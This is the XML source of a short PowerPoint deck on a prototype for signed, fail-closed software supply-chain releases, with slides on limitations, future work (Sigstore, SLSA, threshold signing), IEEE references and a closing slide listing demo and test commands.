              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fail-closed gate + hash-chained audit log</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="2697480"/>
            <a:ext cx="2697480" cy="3520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3310128" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Limitations</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Stolen key valid until revoked</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Proves who built it, not that source is benign</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Software key store in prototype</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit log not yet public</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2697480"/>
            <a:ext cx="2697480" cy="3520440"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C5CDD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6144768" y="2743200"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Future work</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="3154680"/>
            <a:ext cx="2514600" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Sigstore keyless + Rekor log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SLSA L3 provenance, reproducible builds</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>2-of-3 threshold release signing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="228600" indent="-228600">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SBOM signing, cloud KMS backend</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r>
              <a:rPr sz="2800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>References (IEEE)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="411480" y="1371600"/>
            <a:ext cx="8321040" cy="4846320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[1] Codecov, "Bash Uploader Security Update," Apr. 2021. https://about.codecov.io/security-update/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[2] J. Menn and R. Satter, "Codecov hackers breached hundreds of restricted customer sites - sources," Reuters, Apr. 19, 2021.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[3] HashiCorp, "HCSEC-2021-12 - Codecov Security Event and HashiCorp GPG Key Exposure," Apr. 2021.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[4] NIST, "Secure Hash Standard (SHS)," FIPS 180-4, 2015.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[5] S. Josefsson and I. Liusvaara, "Edwards-Curve Digital Signature Algorithm (EdDSA)," RFC 8032, 2017.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[6] E. Rescorla, "The Transport Layer Security (TLS) Protocol Version 1.3," RFC 8446, 2018.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[7] E. Barker, "Recommendation for Key Management," NIST SP 800-57 Pt. 1 Rev. 5, 2020.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[8] M. Souppaya et al., "Secure Software Development Framework v1.1," NIST SP 800-218, 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[9] OpenSSF, "SLSA Specification v1.0," 2023. https://slsa.dev</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[10] Z. Newman, J. S. Meyers, S. Torres-Arias, "Sigstore: Software Signing for Everybody," ACM CCS, 2022.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[11] J. Samuel et al., "Survivable Key Compromise in Software Update Systems," ACM CCS, 2010.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>[12] A. Shostack, Threat Modeling: Designing for Security, Wiley, 2014.</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Date Placeholder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="6561453"/>
            <a:ext cx="2133600" cy="227965"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{32601AF0-D8BA-4D5A-B7C0-9D75EC9DB88D}" type="datetime1">
              <a:rPr lang="en-IN" sz="1200" b="1" smtClean="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:pPr/>
              <a:t>08-09-2026</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN" sz="1200" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7010400" y="6552943"/>
            <a:ext cx="2133600" cy="296544"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{58CAE0E1-5C16-469C-80A6-45E1950F1503}" type="slidenum">
              <a:rPr lang="en-IN" sz="1600" b="1" smtClean="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>3</a:t>
            </a:fld>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="731520"/>
            <a:ext cx="8412480" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="ctr" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="TextBox 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="2103120"/>
            <a:ext cx="8412480" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="4400" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Thank You</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="3017520"/>
            <a:ext cx="8412480" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2600" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Questions?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="4206240"/>
            <a:ext cx="8412480" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1400" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Prototype, tests and documentation: secure-supply-chain/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
              </a:rPr>
              <a:t>python demo.py   ·   python -m pytest -v   ·   python -m attack_simulation.run_all</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/theme/theme1.xml><?xml version="1.0" encoding="utf-8"?>
<a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" name="Axis">
  <a:themeElements>
    <a:clrScheme name="Southwestern">
      <a:dk1>
        <a:srgbClr val="000000"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
      </a:lt1>
      <a:dk2>
        <a:srgbClr val="0E2841"/>
      </a:dk2>
      <a:lt2>
        <a:srgbClr val="E8E8E8"/>
      </a:lt2>
      <a:accent1>
        <a:srgbClr val="A8BABF"/>
      </a:accent1>
      <a:accent2>
        <a:srgbClr val="C16A38"/>
      </a:accent2>
      <a:accent3>
        <a:srgbClr val="7B441F"/>
      </a:accent3>
      <a:accent4>
        <a:srgbClr val="DAC68B"/>
      </a:accent4>
      <a:accent5>
        <a:srgbClr val="B6BAA5"/>
      </a:accent5>
      <a:accent6>
        <a:srgbClr val="716C34"/>
      </a:accent6>
      <a:hlink>
        <a:srgbClr val="467886"/>
      </a:hlink>
      <a:folHlink>
        <a:srgbClr val="96607D"/>
      </a:folHlink>
    </a:clrScheme>
    <a:fontScheme name="Custom 13">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Axis" id="{2A75EA04-0AE5-4074-9538-7DA6C138DAE9}" vid="{E39B6906-D52F-4B95-B43C-27F512CB479C}"/>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Axis</Template>
  <TotalTime>3</TotalTime>
  <Words>50</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>24</Paragraphs>
  <Slides>4</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4</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="12" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Cambria</vt:lpstr>
      <vt:lpstr>Lucida Sans</vt:lpstr>
      <vt:lpstr>Neue Haas Grotesk Text Pro</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>Axis</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Principal</dc:creator>
  <cp:lastModifiedBy>FACULTY 3</cp:lastModifiedBy>
  <cp:revision>30</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-10-24T06:15:58Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-09-08T06:27:48Z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6B284E3421846AF5F518FB68502C439A_43</vt:lpwstr>
  </property>
  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="KSOProductBuildVer">
    <vt:lpwstr>1033-6.15.0.8733</vt:lpwstr>
  </property>
</Properties>
</file>